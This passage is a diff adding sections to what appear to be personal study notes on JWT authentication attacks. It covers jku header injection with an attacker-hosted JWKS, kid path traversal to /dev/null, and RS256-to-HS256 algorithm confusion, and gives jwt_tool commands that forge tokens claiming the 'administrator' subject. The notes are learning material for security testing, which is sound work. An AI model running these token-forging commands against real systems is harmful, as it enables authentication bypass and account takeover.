@@ -66,3 +66,74 @@ PS : watchout the KID needs to be the same in both fields
 
 // to create own script helpful link 
 https://ktor.io/docs/rsa-keys-generation.html#populating-the-jwks-json-file
+
+## Injecting self-signed JWTs via the jku parameter
+
+didn't understand how it works, but those are the main steps :
+
+run the command 
+
+    python3 jwt_tool <jwt> -X s -ju <url> -T
+
+the script will generate a config that the url which is our server needs to return 
+example :
+
+    {
+        "keys":[
+            {
+                "kty":"RSA",
+                "kid":"jwt_tool",
+                "use":"sig",
+                "e":"AQAB",
+                "n":"wnfych1Rg1lGvds211TCWv0t6lpxMJ4JQjqpihOETIozqGwz1tyJNSHXOUXD9Rj6xLPH0DjP8dI8_qvwRqE-EaLldSoGPjPuDEsKqNbcd4acCqnAmAlfj3c7LTvV42kMDZLD9olnVj5dUXEKnGYrSr1_BiQhGG4lqIoTaCTVBam1yI-Jnn-y63XH8sRb6BxR2Kj2FdMUqIwYpaSUokGQZSVhO6fK787yPrkTVqYlWkgn691BW5T_njdIZi6IpnhU1OeF4Z-DQYGFyzcsmxOfZMtLG1XXqiteRIHBs-4-orCKizUfN8QcJs2_fs9wFImhF3YQklVYlzU2LbOw3Kou9w"
+            }
+        ]
+    }
+So the URL need to be a server that return this respone with application/json in content-type, and then we can use the forged token to connect. 
+
+## JWT authentication bypass via kid header path traversal
+
+Some time the server to verify the value, it looks in a file using kid, the key for this attack, is to change the fil to ../../../../../dev/null and change the claims to do that with jwt_tool
+
+    jwt_tool <jwt_token> -I -hc kid -hv '../../../../dev/null' -pc sub -pv 'administrator' -S hs256 -p ''  # for empty password
+
+## algorithm confusion attack
+
+algorithm confusion attack exists in a flow of the verify method, many libraries provide this function of verification. 
+
+    function verify(token, secretOrPublicKey){
+        algorithm = token.getAlgHeader();
+        if(algorithm == "RS256"){
+            // Use the provided key as an RSA public key
+        } else if (algorithm == "HS256"){
+            // Use the provided key as an HMAC secret key
+        }
+    }
+
+Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method as follows:
+
+    publicKey = <public-key-of-server>;
+    token = request.getCookie("session");
+    verify(token, publicKey);
+
+In this case, if the server receives a token signed using a symmetric algorithm like HS256, the library's generic verify() method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.
+
+so to perform the attack we need : 
+
+1. Obtain the server's public key
+2. Convert the public key to a suitable format
+3. Create a malicious JWT with a modified payload and the alg header set to HS256.
+4. Sign the token with HS256, using the public key as the secret.
+
+and to find the public key used, the standards recommand to use these endpoints :  `/jwks.json` or `/.well-known/jwks.json`
+
+using jwt_tool the command will be the following 
+
+    jwt_tool <jwt_token> -X k -pk <public_key.pem> -I -pc  sub  -pv administrator
+
+to generate the pem file, install jwt editor in burp
+then go to generate new RSA key , and copy the jsonfile file found in `/jwks.json` example : 
+
+    {"kty":"RSA","e":"AQAB","use":"sig","kid":"4b87d66e-6cfa-41ab-b677-f4afd2a123dd","alg":"RS256","n":"k84FbNQguvNDChkDeyajY3jG9qWuSPPmpWwr92Q2hz8x9sHWHpWF_XTHlmKV4s7qD0i2Z-7W6Nkv7INnH1GlUiRWnEPTmcqfPJkbLRK9R4gB37OIVJFtouDyzGEdF36XJPy9tv6mM3iORs5KFBuP5py5DDX8GKotgJfKJV9uNE2z47gkIzgf_u-HcGCIABnFEUJ9ipqoL6XRbBaxfqD9q7fIsFNryyZrjInOXbnXSNnk0bOcxnrVtQRZ3DHkQyewBsP0KpnkfEErt_u38PP_Sek0EYdYi_aKNTmiuCRqLVYLRHfx0oJnztMarOaTvubWlM__POCrEJZi9qzGVhYQWQ"}
+
+then export it into pem file ( need to find other methods to do it )
